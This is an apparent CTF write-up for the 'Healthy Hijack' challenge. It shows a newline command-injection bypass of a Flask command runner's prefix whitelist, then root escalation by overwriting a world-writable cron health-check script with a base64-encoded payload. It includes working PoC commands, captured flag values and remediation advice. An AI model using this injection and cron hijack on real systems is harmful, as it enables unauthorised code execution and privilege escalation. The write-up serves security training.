# Healthy Hijack - 1 — Full Writeup

**Category:** Infra / Web → Privilege Escalation
**Difficulty:** 10 points
**Target:** `http://kicyber-09f8ad8ee6f2-healthyhijack-0-0.chals.io`
**Goal:** Explore the system, identify weaknesses, and escalate privileges to root.

---

## TL;DR (Flags)

| Flag type | Location | Value |
|---|---|---|
| User flag | `/home/appuser/user.txt` | `KPMG_CTF{5aPpZrq2OS51019_pLF7fU2xhbwlhgFasoBE0eHVKPsL}` |
| Root flag | `/root/root.txt` | `KPMG_CTF{091734c0b3cb2cfaada1e4f4e3cc005a}` |

---

## 1. Reconnaissance

The root page `/` returns a Flask app (`Werkzeug/3.1.8`, `Python 3.11.15`) called
**"Safe Command Runner"** – a single form that POSTs a `cmd` parameter to `/run`:

> "Only network debugging commands are allowed." / "Hint: Only certain commands are allowed"

Brute-forcing which commands pass the filter showed a small whitelist:

| Command | Allowed? |
|---|---|
| `ping`, `traceroute`, `nslookup` | Allowed |
| `curl`, `wget`, `dig`, `host`, `nc`, `telnet`, `nmap`, `mtr`, `whois`, `ss`, `netstat`, `tcpdump`, `smbclient` | **Rejected** |

Everything else returned `Command not allowed` (HTTP 403). `ping` always failed with
`socket: Operation not permitted` inside the container, but `nslookup` and `traceroute`
executed fine.

---

## 2. Source Code Review (recovered from the live server)

Because `nslookup` executed, I injected a newline followed by `cat /app/app.py` and
recovered the application source (`artifacts/app.py`). The critical logic:

```python
ALLOWED_COMMANDS = ["ping", "traceroute", "nslookup"]

def is_allowed(cmd):
    return any(cmd.startswith(c) for c in ALLOWED_COMMANDS)   # prefix check only

def sanitize(user_input):
    blacklist = [";", "&", "|", "`", "$(", "<"]
    for b in blacklist:
        user_input = user_input.replace(b, "")                # naive removal
    return user_input

...
cmd = sanitize(cmd)
result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT, timeout=10)
```

**Vulnerabilities in the filter:**

1. **Prefix whitelist** – `is_allowed` uses `cmd.startswith(...)`, so the input only
   needs to *begin* with an allowed command.
2. **Incomplete blacklist + `shell=True`** – the sanitizer strips `; & | \` $( <` but
   **forgets the newline character (`\n`)**. Combined with `subprocess.run(..., shell=True)`,
   a newline acts as a command separator, giving us arbitrary command execution as the
   `appuser` (uid=1000).
3. The whitelist is checked **before** sanitisation, so any input starting with
   `nslookup` (or `ping`/`traceroute`) passes and the injected line is unaffected.

---

## 3. Filter Bypass → Command Injection (User Shell)

PoC payload – a benign command on the first line, injected command on the next:

```bash
curl -sk -X POST https://kicyber-09f8ad8ee6f2-healthyhijack-0-0.chals.io/run \
  --data-urlencode $'cmd=nslookup localhost\nid'
```

Result (`id` output):

```
Server:    172.18.0.1
Address:   172.18.0.1#53
...
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
```

The poison characters `; & | \` $( <` are stripped *globally*, including inside the
injected command, so every injected command must avoid them (use `\n` to chain commands,
avoid redirection with `<`, avoid `2>&1`, etc.). A reusable helper is in
`artifacts/poc_rce.sh`:

```bash
./artifacts/poc_rce.sh 'cat /etc/passwd'
```

### System enumeration (as appuser)

- Container: Debian 13 (trixie), hostname `395fbbc87a65`
- `appuser` (uid=1000), shell `/bin/sh`, cwd `/app`
- No SUID binaries (`find / -perm -4000` → empty)
- `/root` and `/etc/shadow` not readable
- **User flag found:** `/home/appuser/user.txt` →
  `KPMG_CTF{5aPpZrq2OS51019_pLF7fU2xhbwlhgFasoBE0eHVKPsL}`

---

## 4. Privilege Escalation to Root

### The misconfiguration

`/etc/crontab` runs a health-check script **as root**, several times per minute:

```
* * * * * root /opt/healthcheck.sh
* * * * * root sleep 10 && /opt/healthcheck.sh
* * * * * root sleep 20 && /opt/healthcheck.sh
* * * * * root sleep 30 && /opt/healthcheck.sh
* * * * * root sleep 40 && /opt/healthcheck.sh
* * * * * root sleep 50 && /opt/healthcheck.sh
* * * * * root find /tmp -perm /4000 -delete
```

And the script is **world-writable**:

```
-rwxrwxrwx 1 root root 58 May 5 15:24 /opt/healthcheck.sh
```

(Note the last cron line deletes SUID files under `/tmp`, so a classic `cp /bin/sh`
SUID trick in `/tmp` would be cleaned up – the intended vector is the writable script.)

### Exploit

1. Overwrite `/opt/healthcheck.sh` with a payload that copies the root flag to a
   world-readable location. Base64 was used so no filtered characters appear in the
   injected command:

   ```bash
   # payload file /opt/healthcheck.sh becomes:
   #!/bin/sh
   cp /root/root.txt /tmp/rootflag.txt
   chmod 666 /tmp/rootflag.txt

   # install it (note: no ; & | ` $( < characters)
   echo IyEvYmluL3NoCmNwIC9yb290L3Jvb3QudHh0IC90bXAvcm9vdGZsYWcudHh0CmNobW9kIDY2NiAvdG1wL3Jvb3RmbGFnLnR4dAo= > /tmp/b64
   base64 -d /tmp/b64 > /opt/healthcheck.sh
   ```

2. Wait ≤ 60 s (cron fires at :00, :10, :20, :30, :40, :50 every minute).

3. Read the exfiltrated flag:

   ```
   $ cat /tmp/rootflag.txt
   KPMG_CTF{091734c0b3cb2cfaada1e4f4e3cc005a}     (43 bytes, owned by root, mode 666)
   ```

4. **Clean-up** – restore the original health-check script (best practice when
   completing a CTF):

   ```bash
   echo IyEvYmluL3NoCiMgU3lzdGVtIGhlYWx0aGNoZWNrCmVjaG8gIk9LIiA+IC90bXAvaGVhbHRoLmxvZwo= > /tmp/b64
   base64 -d /tmp/b64 > /opt/healthcheck.sh
   ```

---

## 5. Attack Chain Summary

```
Web form (/run) ── nslookup prefix passes whitelist
        │
        ├─ sanitizer forgets newline "\n"
        │
        ▼
subprocess.run(shell=True)  →  RCE as appuser (uid=1000)
        │
        ├─ /home/appuser/user.txt   →  USER FLAG
        │
        ▼
/etc/crontab:  * * * * * root /opt/healthcheck.sh   (root, every 10 s)
        │
        ▼
/opt/healthcheck.sh is -rwxrwxrwx (world-writable, root-owned)
        │
        ▼
Overwrite with: cp /root/root.txt /tmp/rootflag.txt; chmod 666
        │
        ▼
next cron tick runs it as root  →  ROOT FLAG read
```

---

## 6. Remediation (fix suggestions)

1. **Never use `shell=True` with user input.** Use `subprocess.run([cmd, arg, ...])`
   with an argument list, or better, restrict arguments with a strict allow-list
   (e.g., only allow IP/hostname arguments matching a regex).
2. **Fix the prefix whitelist** – `startswith("ping")` accepts `ping;evil`-style input.
   Tokenize the input and match the exact command against an allow-list of binaries
   *and* their options.
3. **Fix the blacklist** – blocklists are inherently fragile (here `\n`, `>`, tabs,
   `$`, `)`, `{}` were all still usable). Prefer allow-listing safe characters.
4. **Remove the world-writable cron script** – run cron jobs from root-only readable
   paths (`/usr/local/sbin`, 0755 root:root).
5. **Sanitize/preserve the shell environment** – run cron with an explicit
   `SHELL`/`PATH` and avoid executing files in writable directories.

---

## 7. Timeline (UTC)

| Time | Step |
|---|---|
| 02:15 | Recon: root page, whitelist probe, allowed commands identified |
| 02:16 | Newline injection → RCE as `appuser`; recovered `app.py` |
| 02:17 | Enumeration: crontab, permissions, SUID – no direct root paths |
| 02:19 | Wrote root flag exfil payload into `/opt/healthcheck.sh` |
| 02:19 | **Root flag captured** via next cron run |
| 02:20 | Confirmed/re-read flag, restored `healthcheck.sh` |

## 8. Artifacts

- `artifacts/app.py` – recovered application source
- `artifacts/poc_rce.sh` – reusable RCE helper
- `artifacts/healthcheck_payload.sh` – root exfil payload
- `artifacts/flags.txt` – captured flags
- `artifacts/evidence_output.txt` – key command outputs